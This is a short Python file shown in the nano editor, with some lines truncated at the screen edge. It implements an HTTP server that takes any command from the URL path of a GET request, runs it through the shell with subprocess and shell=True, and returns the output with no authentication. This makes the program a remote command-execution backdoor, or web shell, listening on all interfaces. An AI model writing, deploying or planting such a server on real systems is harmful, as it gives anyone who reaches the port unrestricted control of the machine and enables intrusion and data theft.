GNU nano 8.0                 py.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess
import json

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        command = self.path[1:]  # Get command from URL path

        if command == 'connect':
            response = {"status": "connected", "message": "serv>
            self._send_response(200, response)
        else:
            result = subprocess.run(command, shell=True, captur>
            response = {"output": result.stdout}
            self._send_response(200, response)

    def _send_response(self, status_code, response):
        self.send_response(status_code)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())

def run(server_class=HTTPServer, handler_class=RequestHandler, >
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}')
    httpd.serve_forever()

if __name__ == '__main__':
    run()